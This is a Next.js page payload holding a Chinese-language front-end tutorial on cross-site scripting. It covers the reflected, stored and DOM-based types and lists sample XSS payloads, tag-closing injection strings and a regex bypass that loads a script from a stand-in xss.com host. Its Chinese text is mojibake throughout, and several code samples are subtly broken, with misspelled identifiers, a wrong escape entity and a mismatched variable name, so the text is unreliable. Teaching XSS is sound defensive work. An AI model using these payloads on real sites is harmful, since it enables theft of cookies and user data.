1:"$Sreact.fragment"
2:I[5244,[],""]
3:I[3866,[],""]
5:I[6213,[],"OutletBoundary"]
7:I[6213,[],"MetadataBoundary"]
9:I[6213,[],"ViewportBoundary"]
b:I[4835,[],""]
:HL["/_next/static/media/569ce4b8f30dc480-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/media/93f479601ee12b01-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/d498c84e4ab246b3.css","style"]
:HL["/_next/static/css/485ff6fe79292a08.css","style"]
:HL["/_next/static/css/b9d97b2190475167.css","style"]
:HL["/_next/static/css/851cdee6d90716dd.css","style"]
0:{"P":null,"b":"NFjmtHF2up8B2PpbDjLiS","p":"","c":["","front-end","computer-networks","web-security","xss"],"i":false,"f":[[["",{"children":["front-end",{"children":[["slug","computer-networks/web-security/xss","oc"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d498c84e4ab246b3.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/485ff6fe79292a08.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","2",{"rel":"stylesheet","href":"/_next/static/css/b9d97b2190475167.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"className":"__variable_4d318d __variable_ea5f4b antialiased","children":["$","$L2",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[],[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]}]]}],{"children":["front-end",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/851cdee6d90716dd.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","main",null,{"children":["$","$L2",null,{"parallelRouterKey":"children","segmentPath":["children","front-end","children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["slug","computer-networks/web-security/xss","oc"],["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","segmentPath":["children","front-end","children","$0:f:0:1:2:children:2:children:0","children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":"$L6"}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","kzUj0R-Vs_sMSGaiqwXNX",{"children":[["$","$L7",null,{"children":"$L8"}],["$","$L9",null,{"children":"$La"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}]]}],false]],"m":"$undefined","G":["$b","$undefined"],"s":false,"S":true}
c:Ta2b6,<h1>XSS è·¨ç«™è„šæœ¬æ”»å‡»</h1>
<p>XSS æ”»å‡»å…¨ç§° <strong>è·¨ç«™è„šæœ¬æ”»å‡»</strong>ï¼ˆCross-Site Scriptingï¼‰ï¼Œæ˜¯ä¸€ç§ä»£ç æ³¨å…¥æ”»å‡»ã€‚</p>
<ul>
<li>æ”»å‡»æ–¹æ³•ï¼šæ”»å‡»è€…åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•åœ¨ç›®æ ‡ç½‘ç«™ HTML é¡µé¢ä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œã€‚åˆ©ç”¨è¿™äº›æ¶æ„è„šæœ¬ï¼Œæ”»å‡»è€…å¯è·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯å¦‚ Cookieã€SessionID ç­‰ï¼Œè¿›è€Œå±å®³æ•°æ®å®‰å…¨ã€‚</li>
<li>æœ¬è´¨ï¼šæ¶æ„ä»£ç æœªç»è¿‡æ»¤ï¼Œä¸ç½‘ç«™æ­£å¸¸çš„ä»£ç æ··åœ¨ä¸€èµ·ï¼›æµè§ˆå™¨æ— æ³•åˆ†è¾¨å“ªäº›è„šæœ¬æ˜¯å¯ä¿¡çš„ï¼Œå¯¼è‡´æ¶æ„è„šæœ¬è¢«æ‰§è¡Œã€‚</li>
</ul>
<h2>æ”»å‡»ç§ç±»</h2>
<p>æ ¹æ®æ”»å‡»çš„æ¥æºï¼ŒXSS æ”»å‡»å¯åˆ†ä¸º <strong>åå°„å‹</strong>ã€<strong>å­˜å‚¨å‹</strong> å’Œ <strong>DOM-Based å‹</strong>ä¸‰ç§ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:left">ç±»å‹</th>
<th style="text-align:left">å­˜å‚¨åŒº</th>
<th style="text-align:left">æ’å…¥ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">åå°„å‹</td>
<td style="text-align:left">URL</td>
<td style="text-align:left">HTML</td>
</tr>
<tr>
<td style="text-align:left">å­˜å‚¨å‹</td>
<td style="text-align:left">æœåŠ¡ç«¯æ•°æ®åº“</td>
<td style="text-align:left">HTML</td>
</tr>
<tr>
<td style="text-align:left">DOM-Based å‹</td>
<td style="text-align:left">æœåŠ¡ç«¯æ•°æ®åº“ / å®¢æˆ·ç«¯å­˜å‚¨ / URL</td>
<td style="text-align:left">å‰ç«¯ JavaScript</td>
</tr>
</tbody>
</table>
<p>åè¯è¯´æ˜ï¼š</p>
<ul>
<li><strong>å­˜å‚¨åŒº</strong>ï¼šæ¶æ„ä»£ç å­˜æ”¾çš„ä½ç½®</li>
<li><strong>æ’å…¥ç‚¹</strong>ï¼šç”±è°å–å¾—æ¶æ„ä»£ç ï¼Œå¹¶æ’å…¥åˆ°ç½‘é¡µä¸Š</li>
</ul>
<h3>åå°„å‹</h3>
<p>åå°„å‹ XSS æ”»å‡»åˆç§°ä¸º<strong>éæŒä¹…æ€§è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»</strong>ï¼Œè¿™ç§æ”»å‡»ç±»å‹é€šè¿‡è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥æ¥é€ æˆä¸€æ¬¡æ€§æ”»å‡»ã€‚</p>
<p><strong>æ”»å‡»æ–¹å¼</strong>ï¼šæ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯æ”»å‡»è€… &lt;strong style=&quot;color:red&quot;&gt;æ³¨å…¥çš„æ•°æ®åæ˜ åœ¨è¯·æ±‚å“åº”&lt;/strong&gt; ä¸­ã€‚ç”¨æˆ·è®¿é—®ä¸€ä¸ªè¢«æ”»å‡»è€…ç¯¡æ”¹åçš„é“¾æ¥ï¼Œç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œè¢«æ¤å…¥çš„æ”»å‡»è„šæœ¬è¢«ç”¨æˆ·æµè§ˆå™¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚é€šè¿‡ URL å‚æ•°ç›´æ¥æ³¨å…¥ï¼Œç„¶ååœ¨å“åº”çš„æ•°æ®ä¸­åŒ…å«ç€å±é™©çš„ä»£ç ã€‚</p>
<p>æ”»å‡»æ­¥éª¤ï¼š</p>
<ol>
<li>æ”»å‡»è€…æŠŠå¸¦æœ‰æ¶æ„è„šæœ¬ä»£ç å‚æ•°çš„ URL åœ°å€å‘é€ç»™ç”¨æˆ·</li>
<li>ç”¨æˆ·ç‚¹å‡»æ­¤é“¾æ¥</li>
<li>æœåŠ¡å™¨ç«¯è·å–è¯·æ±‚å‚æ•°å¹¶ä¸”ç›´æ¥ä½¿ç”¨ï¼ŒæœåŠ¡å™¨åå°„å›ç»“æœé¡µé¢</li>
</ol>
<p>è¯´æ˜ï¼š</p>
<ul>
<li>åå°„å‹ XSS æ”»å‡»æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå¿…é¡»è¦é€šè¿‡ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ‰èƒ½å‘èµ·</li>
<li>ä¸€äº›æµè§ˆå™¨å¦‚ Chrome å…¶å†…ç½®äº†ä¸€äº› XSS è¿‡æ»¤å™¨ï¼Œå¯ä»¥é˜²æ­¢å¤§éƒ¨åˆ†åå°„å‹ XSS æ”»å‡»</li>
<li>åå°„å‹ XSS å…¶å®å°±æ˜¯æœåŠ¡å™¨æ²¡æœ‰å¯¹æ¶æ„çš„ç”¨æˆ·è¾“å…¥è¿›è¡Œå®‰å…¨å¤„ç†å°±ç›´æ¥åå°„å“åº”å†…å®¹ï¼Œå¯¼è‡´æ¶æ„ä»£ç åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„ä¸€ç§ XSS æ¼æ´</li>
</ul>
<p>æ”»å‡»ç¤ºä¾‹ï¼š</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-comment">// å‡è®¾è¿™æ˜¯è¯·æ±‚è¿”å›çš„æ•°æ®</span>
  <span class="hljs-keyword">const</span> res = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;&lt;img src=&quot;1&quot; onerror=&quot;console.log(windwo.localStorage)&quot; /&gt;&#x27;</span>];

  <span class="hljs-keyword">const</span> root = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#root&#x27;</span>);

  res.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> p = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;p&#x27;</span>);
    p.<span class="hljs-property">innerHTML</span> = item;
    root.<span class="hljs-title function_">append</span>(p);
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å½“æ•°æ®è¿”å›åï¼Œ<code>&lt;img&gt;</code> æ ‡ç­¾ä¼šæ³¨å…¥ HTML DOM æ–‡æ¡£ä¸­ï¼Œåˆå› ä¸º <code>src</code> å±æ€§ä¸ºæ— æ•ˆçš„ URL å€¼ï¼Œæ‰€ä»¥è§¦å‘äº† <code>onerror</code> äº‹ä»¶ï¼Œä»è€Œæ‰§è¡Œäº† <code>onerror</code> å®šä¹‰çš„å‡½æ•°ï¼Œè¿™æ ·ä¾¿è·å–åˆ°äº†å­˜å‚¨åœ¨å®¢æˆ·ç«¯æœ¬åœ°çš„ <code>localStorage</code> ä¿¡æ¯ã€‚</p>
<blockquote>
<p>ğŸ¤¼â€â™‚ï¸ <strong>åå°„å‹ XSS è·Ÿå­˜å‚¨å‹ XSS çš„åŒºåˆ«æ˜¯ï¼Ÿ</strong></p>
<ul>
<li>åå°„å‹ XSS æ¼æ´å¸¸è§äº &lt;strong style=&quot;color:red&quot;&gt;é€šè¿‡ URL ä¼ é€’å‚æ•°&lt;/strong&gt; çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ã€è·³è½¬ç­‰ã€‚</li>
<li>å­˜å‚¨å‹ XSS çš„æ¶æ„ä»£ç  &lt;strong style=&quot;color:red&quot;&gt;å­˜åœ¨æ•°æ®åº“&lt;/strong&gt; é‡Œï¼Œåå°„å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨ URL é‡Œã€‚</li>
</ul>
<p>ç”±äºéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„ URL æ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚</p>
</blockquote>
<p>POST çš„å†…å®¹ä¹Ÿå¯ä»¥è§¦å‘åå°„å‹ XSSï¼Œåªä¸è¿‡å…¶è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼ˆéœ€è¦æ„é€ è¡¨å•æäº¤é¡µé¢ï¼Œå¹¶å¼•å¯¼ç”¨æˆ·ç‚¹å‡»ï¼‰ï¼Œæ‰€ä»¥éå¸¸å°‘è§ã€‚</p>
<h3>å­˜å‚¨å‹</h3>
<p>å­˜å‚¨å‹ XSS æ”»å‡»åˆç§°ä¸º<strong>æŒä¹…æ€§è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»</strong>ï¼Œé€šå¸¸æ”»å‡»è€…å°†ä»£ç å­˜å‚¨åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·æµè§ˆç›¸å…³é¡µé¢å‘èµ·æ”»å‡»ã€‚</p>
<p>æ”»å‡»æ­¥éª¤ï¼š</p>
<ol>
<li>æ”»å‡»è€…å°†æ¶æ„è„šæœ¬ä»£ç ä¸Šä¼ æˆ–å­˜å‚¨åˆ°æ¼æ´æœåŠ¡å™¨</li>
<li>æœåŠ¡å™¨æŠŠæ¶æ„è„šæœ¬ä¿å­˜åˆ°æœåŠ¡å™¨</li>
<li>å½“æ­£å¸¸å®¢æˆ·è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¯»å–æ¶æ„æ•°æ®å¹¶ä¸”ç›´æ¥ä½¿ç”¨</li>
<li>æœåŠ¡å™¨ä¼šè¿”å›å«æœ‰æ¶æ„è„šæœ¬çš„é¡µé¢</li>
</ol>
<p>å®é™…æ¡ˆä¾‹ï¼š</p>
<ul>
<li>è­¬å¦‚å‘å¸–ä¸­å‘å‡ºåŒ…å«æ¶æ„ä»£ç çš„å†…å®¹ï¼Œå…¶ä»–å†…å®¹è®¿é—®åˆ°è¯¥å†…å®¹åï¼Œæ»¡è¶³ç‰¹å®šæ¡ä»¶åæ¡ä»¶å³è§¦å‘</li>
<li>éœ€è¦åå°ä¸è¿‡æ»¤ä¿¡æ¯ï¼Œå¹¶ä¸”å‰ç«¯å±•ç¤ºæ—¶ä¹Ÿä¸è¿‡æ»¤ä¿¡æ¯</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šè¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ã€å•†å“è¯„è®ºã€ç”¨æˆ·ç§ä¿¡ç­‰ã€‚</p>
<p>ä¿®å¤ï¼šæœåŠ¡ç«¯ä¸€èˆ¬ä¸ä¼šè½»æ˜“å¯¹å¤§é‡å·²å­˜æ•°æ®å†ç¼–è¾‘ã€‚éœ€è¦å¯¹æ–°å†™å…¥æ•°æ®ä¿®æ­£å­˜å‚¨é€»è¾‘ã€‚å‰ç«¯åšå¥½æ­£ç¡®çš„ <strong>ç¼–ç è½¬ä¹‰</strong>ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:left">ç±»å‹</th>
<th style="text-align:left">åå°„å‹</th>
<th style="text-align:left">å­˜å‚¨å‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">æŒä¹…æ€§</td>
<td style="text-align:left">éæŒä¹…</td>
<td style="text-align:left">æŒä¹…åŒ–ï¼ˆå­˜å‚¨åœ¨æœåŠ¡å™¨ï¼‰</td>
</tr>
<tr>
<td style="text-align:left">è§¦å‘æ—¶æœº</td>
<td style="text-align:left">éœ€è¦ç”¨æˆ·ç‚¹å‡»</td>
<td style="text-align:left">ä¸éœ€è¦ç”¨æˆ·äº¤äº’ä¹Ÿå¯ä»¥è§¦å‘</td>
</tr>
<tr>
<td style="text-align:left">å±å®³</td>
<td style="text-align:left">å±å®³è¾ƒå°</td>
<td style="text-align:left">å±å®³æ›´å¤§</td>
</tr>
</tbody>
</table>
<h3>DOM Based å‹</h3>
<p>DOM Based å‹ XSSï¼Œè¿™ç§æ”»å‡»ç±»å‹ä¸éœ€è¦æœåŠ¡å™¨ç«¯æ”¯æŒï¼Œæ˜¯ç”±äº DOM ç»“æ„ä¿®æ”¹å¯¼è‡´çš„ï¼ŒåŸºäºæµè§ˆå™¨ DOM è§£æçš„æ”»å‡»</p>
<p>æ”»å‡»æ­¥éª¤ï¼š</p>
<ol>
<li>ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„çš„é“¾æ¥</li>
<li>æµè§ˆå™¨åœ¨ DOM è§£æçš„æ—¶å€™ç›´æ¥ä½¿ç”¨æ¶æ„æ•°æ®</li>
<li>ç”¨æˆ·ä¸­æ‹›</li>
<li>å¸¸è§çš„è§¦å‘åœºæ™¯å°±æ˜¯åœ¨ä¿®æ”¹ <code>innerHTML</code>ã€<code>outerHTML</code>ã€<code>document.write</code> çš„æ—¶å€™</li>
</ol>
<p>å®é™…æ¡ˆä¾‹ï¼š</p>
<ul>
<li>è­¬å¦‚ Wifi æµè§ˆå™¨åŠ«æŒã€DNS åŠ«æŒï¼Œå¹¶ç›´æ¥è¿”å›é’“é±¼é¡µé¢</li>
<li>æœ¬è´¨æ˜¯éœ€è¦æ›´æ”¹ DOMï¼Œå†æ’é™¤è‡ªå·±æ”»å‡»è‡ªå·±ï¼Œæ‰€ä»¥è¿™é‡Œå•ç‹¬æ‹¿æµé‡åŠ«æŒä¸¾ä¾‹ã€‚ä¸¥æ ¼æ¥è¯´æŸäº›åå°„å‹çš„æ”»å‡»ä¹Ÿèƒ½é€ æˆè¿™ä¸ªåæœ-é€šè¿‡ URL æ§åˆ¶ DOMã€‚</li>
</ul>
<p>DOM å‹ XSS è·Ÿå‰ä¸¤ç§ XSS çš„åŒºåˆ«ï¼šDOM å‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯ JavaScript è‡ªèº«çš„å®‰å…¨æ¼æ´ï¼Œè€Œå…¶ä»–ä¸¤ç§ XSS éƒ½å±äºæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´ã€‚</p>
<h2>æ”»å‡»æ‰‹æ®µ</h2>
<p>æ”»å‡»æ‰‹æ®µï¼š</p>
<ul>
<li>è·å–é¡µé¢çš„æ•°æ®ï¼Œå¦‚ DOMã€Cookieã€LocalStorage</li>
<li>ç ´åé¡µé¢ç»“æ„</li>
<li>æµé‡åŠ«æŒ</li>
<li>æŒ‚é©¬</li>
<li>ç›—å–ç”¨æˆ· Cookie</li>
<li>DDOSï¼ˆæ‹’ç»æœåŠ¡ï¼‰å®¢æˆ·ç«¯æµè§ˆå™¨</li>
<li>é’“é±¼å·¥å…·ï¼Œé«˜çº§çš„é’“é±¼æŠ€å·§</li>
<li>åˆ é™¤ç”¨æˆ·æ–‡ç« ã€æ¶æ„ç¯¡æ”¹æ•°æ®ã€å«ç¥¸</li>
<li>åŠ«æŒç”¨æˆ· Web è¡Œä¸ºï¼Œç”šè‡³è¿›ä¸€æ­¥æ¸—é€å†…ç½‘</li>
<li>çˆ†å‘ Web2.0 è •è™«</li>
<li>è •è™«å¼ DDoS æ”»å‡»</li>
<li>è •è™«å¼æŒ‚é©¬æ”»å‡»ã€åˆ·å¹¿å‘Šã€åˆ·æµé‡ã€ç ´åç½‘ä¸Šæ•°æ®</li>
</ul>
<p>å¸¸è§æœ‰æ•ˆè·è½½ï¼ˆPayloadï¼‰ï¼š</p>
<ul>
<li><code>&lt;input onfocus=write('xss') autofocus&gt;</code></li>
<li><code>&lt;img src onerror=alert('xss')&gt;</code></li>
<li><code>&lt;svg onload=alert('xss') &gt;</code></li>
<li><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></li>
<li><code>&lt;a href=&quot;javascript:alert('xss')&quot;&gt;clickme&lt;/a&gt;</code></li>
</ul>
<blockquote>
<p>XSS è·è½½ï¼ˆXSS Payloadï¼‰æ˜¯æŒ‡æ¶æ„æ¤å…¥ä¸”å…·æœ‰å®Œæˆå„ç§å…·ä½“åŠŸèƒ½çš„æ¶æ„è„šæœ¬ã€‚</p>
</blockquote>
<h3>æ ‡ç­¾æ‹¼æ¥æ¼æ´</h3>
<p>æœåŠ¡ç«¯æ¸²æŸ“ä»£ç ï¼šè¿™é‡Œçš„ <code>input</code> å¯èƒ½æ˜¯å®¢æˆ·ç«¯ä¼ é€’åˆ°æœåŠ¡ç«¯çš„æ•°æ®</p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&#x27;</span>&gt;
}
</code></pre>
<p>æ”»å‡»æ–¹æ³•ï¼šç ´ååŸæ¥çš„ HTML ä»£ç ç»“æ„ï¼Œè®©ä½ å†™çš„ä»£ç ç”Ÿæ•ˆ</p>
<p>è¾“å…¥æ¸²æŸ“çš„ <code>input</code> å˜é‡ä¸º <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>è¾“å‡ºæ¸²æŸ“çš„ HTML ç»“æ„ï¼š<code>&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</code></p>
<p>è¿™æ ·ä½ è„šæœ¬å†…çš„ <code>alert(1)</code> å‡½æ•°è¿”å›åˆ°å‰ç«¯æ¸²æŸ“æ—¶å°±ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚</p>
<h3>æå‰é—­åˆæ ‡ç­¾</h3>
<p>å¯¹äº <code>&lt;textarea&gt;</code> è¿™ç§åŸç”Ÿä¼šè½¬æ¢è¾“å…¥æ•°æ®ä¸ºå­—ç¬¦ä¸²çš„æ ‡ç­¾ï¼Œå¯ä»¥è¾“å…¥æå‰é—­åˆæ ‡ç­¾ç»•è¿‡ï¼š</p>
<p><code>&lt;/textarea&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</code></p>
<p>æˆ–è€… <code>input</code>æ ‡ç­¾ï¼š</p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;
}
</code></pre>
<p>è¾“å…¥ <code>input</code> å˜é‡ï¼š<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>è¾“å‡ºæ¸²æŸ“çš„ HTML ç»“æ„ï¼š<code>&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&quot;&gt;</code></p>
<h3>åˆæ³• HTML è½¬ä¹‰æ¼æ´</h3>
<p>æœåŠ¡ç«¯æ¸²æŸ“ä»£ç ï¼šå°†ç”¨æˆ·è¾“å…¥ä»£ç é€šè¿‡åˆæ³•çš„ HTML æ ‡ç­¾è½¬ä¹‰è¾“å‡ºï¼Œè¿”å›ç»™å‰ç«¯æ¸²æŸ“</p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-comment">// HTML çš„å­—ç¬¦è½¬ä¹‰</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-keyword">return</span> s
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;rt;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f&#x27;</span>);
  }

  <span class="hljs-keyword">const</span> domainReg = <span class="hljs-regexp">/^https?:\/\/www\.example\.com/</span>;

  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_">test</span>(input)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">${escapeHtml(input)}</span>&quot;&gt;&lt;/script&gt;`</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>;
}
</code></pre>
<p>æ”»å‡»æ–¹æ³•ï¼šåˆ›å»ºå¤šçº§åŸŸåï¼Œå­å­™çº§åŸŸåä¸­å¸¦ <code>.com</code></p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-comment">// è¾“å…¥</span>
<span class="hljs-keyword">const</span> input = <span class="hljs-string">&#x27;https://www.example.com.xss.com/foo.js&#x27;</span>;
</code></pre>
<p>è¾“å‡ºæ¸²æŸ“çš„ HTML DOM ç»“æ„ï¼šé‚£ä¹ˆè¿™ä¸ªè¾“å…¥çš„ URL å°±ä¼šè¢«æ‰§è¡Œäº†</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http:&amp;#x2f&amp;#x2fwww.example.com.xss.com&amp;#x2ffoo.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>HTML è½¬ç åœ¨ URL å’Œ JavaScript ä¸­éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p>
<h3>åˆæ³• JS è½¬ä¹‰æ¼æ´</h3>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// JavaScript çš„å­—ç¬¦è½¬ä¹‰</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeJs</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-keyword">return</span> s
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/`/g</span>, <span class="hljs-string">&#x27;\\`&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\74&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;\\76&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&#x27;\\n&#x27;</span>)
